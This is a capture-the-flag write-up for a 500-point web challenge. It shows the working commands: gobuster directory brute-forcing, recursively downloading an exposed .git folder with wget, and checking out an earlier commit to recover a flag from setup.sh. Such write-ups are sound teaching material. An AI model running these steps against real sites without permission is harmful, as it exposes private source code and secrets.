# WH02 - 500pts

## Briefing

> Access the site at <https://cfta-wh02.allyourbases.co> and find a way to get the flag.

## Solution

1. We can try directory bruteforcing because the website source code does not reveal anything. Let's use `gobuster`: `gobuster dir -u https://cfta-wh02.allyourbases.co/ -t 200 --exclude-length 16 -w /usr/share/wordlists/dirb/common.txt`. We exclude the length `16` because 404 pages return HTTP status code 403 and have a length of 16. Running the command finds `/.git/HEAD`, which means there is a publicly facing git repository on the website.

2. We can download the git repo with `wget -r -np -R "index.html*" https://cfta-wh02.allyourbases.co/.git/`. Run `git checkout -- .` to restore `index.html` since we only download the `.git/` folder, not the entire working directory.

3. Run `git log` to look for previous commits. Sure enough there is one previous commit. Run `git checkout 80e789704ddca67d772dbc34de1088e8c1917e9d` to revert to that previous version. There is now a `setup.sh` file. `cat setup.sh` shows the flag `FLAG="giTisAGreat_ResoURCe8337"`

### Flag

`giTisAGreat_ResoURCe8337`
